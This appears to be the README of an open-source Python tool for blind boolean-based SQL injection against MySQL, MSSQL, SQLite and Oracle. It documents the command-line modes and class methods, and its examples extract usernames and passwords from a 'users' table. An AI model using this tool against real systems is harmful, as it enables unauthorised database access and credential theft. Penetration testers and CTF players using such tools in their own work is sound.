# SQLi blinder

Framework for blind boolean-based sql injections explotation. Use it if sqlmap do shit. 

Support:
- MySQL
- MSSQL
- SQLite
- Oracle

Requires Python 3.x.

There is no dependencies, just `pip install requests` for example `request_func`.

## Usage

You could use sqlib.py console utility or do your own script by importing `sqli_blinder.SQLiBlinder`, but both cases requires you to create your own `request_func`.

### Prepare request_func

The `request_func` must paste single input param to your SQL injection and issue request.
It must return `True` for input param `1=1` and `False` for input param `1=0`.

It's OK to throw on unexpected behavior.

Example presented in `sqlib.py`.

Check your `request_func` with:

```python
SQLiBlinder(request_func,dbms).check()
```

If you want to use sqlib.py - replace `request_func` with your own.

### Run sqlib.py

```
usage: sqlib.py [-h] [-t TABLE] [-c COLUMN] [-w WHERE] [-i INDEX]
                [--threads THREADS] --dbms {mysql,mssql,sqlite,oracle}
                {check,count,one,get}

positional arguments:
  {check,count,one,get}
                        mode - one of ['check','count','one','get']

optional arguments:
  -h, --help            show this help message and exit
  -t TABLE, --table TABLE
                        table nmae
  -c COLUMN, --column COLUMN
                        column names. For get mode could by comma separated array of columns
  -w WHERE, --where WHERE
                        where clause
  -i INDEX, --index INDEX
                        index of row
  --threads THREADS     number of threads
  --dbms {mysql,mssql,sqlite,oracle} DBMS
```

Examples:

`python sqlib.py count -t sqlite_master --dbms sqlite` - get count of rows in `sqlite_master` table

`python sqlib.py count -t users --dbms sqlite --where "username='admin'"` - get number of rows in `sqlite_master` table

`python sqlib.py one -t users -c password -i 1 --dbms sqlite` - get value of `password` column in `users` table with index `1`

`python sqlib.py get -t users -c username,password --dbms sqlite` - get all `username` and `password` from `users` table

### SQLiBlinder class

There is four intended public methods:

- `check()` - check provided `request_func` with `1=1` and `1=0` payloads

- `get_count(table_name,where=None)` - get count of rows in `table` with provided `where` clause

- `get_string(table,column,index,where=None)` - get value of `column` in `table` with index=`index`. `where` is optional

- `get(columns,table_name,where=None)` - get all columns in `columns` from `table` where `where`

examples:

```python
sqlib = SQLiBlinder(request_func,'sqlite',multithreaded=True,threads=16)
sqlib.check() # True
sqlib.get_count('sqlite_master') # number of rows in sqlite_master
sqlib.get_string('sqlite_master','sql',1,) # code of first table
sqlib.get(['username','password'],'users') # all usernames and passwords
sqlib.get(['username','password'],'users',where="username='admin'") # admins username and password
```